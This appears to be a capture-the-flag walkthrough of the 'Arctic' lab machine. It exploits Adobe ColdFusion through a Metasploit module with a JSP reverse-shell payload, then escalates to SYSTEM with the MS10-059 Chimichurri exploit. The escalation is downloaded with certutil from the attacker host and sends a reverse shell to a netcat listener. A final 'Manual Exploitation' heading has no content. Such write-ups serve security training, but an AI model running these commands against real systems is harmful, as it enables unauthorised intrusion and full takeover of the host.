# Arctic

<pre>nmap -p 135,8500,49154 -sV -Pn 10.10.10.11        

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC</pre>

![alt text](<../Images/Arctic 1.png>)

- CFIDE directory stands for ColdFusion Integrated Development Environment
- Directory in Adobe ColdFusion installations that contains various files and resources used by ColdFusion applications






## Method 1 Metasploit

<pre>exploit/windows/http/coldfusion_fckeditor

set RHOSTS

set LHOST 

set LPORT

set PAYLOAD java/jsp_shell_reverse_tcp

set HTTPCLIENTTIMEOUT 150

run

msf6 exploit(windows/http/coldfusion_fckeditor) > exploit</pre>

<pre>C:\ColdFusion8\runtime\bin>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled



C:\ColdFusion8\runtime\bin>net user
net user

User accounts for \\ARCTIC

-------------------------------------------------------------------------------
Administrator            Guest                    tolis                    
The command completed successfully.</pre>

<pre>C:\ColdFusion8\runtime\bin>net user tolis
net user tolis
User name                    tolis
Full Name                    tolis
Comment                      
User's comment               
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            22/3/2017 9:07:58   
Password expires             Never
Password changeable          22/3/2017 9:07:58   
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   16/5/2024 2:23:36   

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.</pre>

## Windows Exploit Suggester - Privilege Escalation

- Save output from `systeminfo` into sysinfo.txt
- Update the database

<pre>./windows-exploit-suggester.py --update</pre>

<pre>./windows-exploit-suggester.py --database 2024-05-14-mssb.xls --systeminfo sysinfo.txt</pre>

<pre>[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical</pre>

- Use `MS10-059:Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important`

https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-059/README.md

- Transfer to target machine

<pre>python -m SimpleHTTPServer</pre>

<pre>certutil -urlcache -f http://10.10.14.8/MS10-059.exe MS10-059.exe</pre>

- Execute `MS10-059.exe` on target machine

<pre>MS10-059.exe
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Usage: Chimichurri.exe ipaddress port <BR></pre>

- Setup netcat listener on attacking machine

<pre>nc -nvlp 5555</pre>

<pre>MS10-059.exe 10.10.14.8 5555</pre>

<pre>nc -nvlp 5555
listening on [any] 5555 ...
connect to [10.10.14.8] from (UNKNOWN) [10.10.10.11] 49666
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
nt authority\system</pre>

## Method 2 Manual Exploitation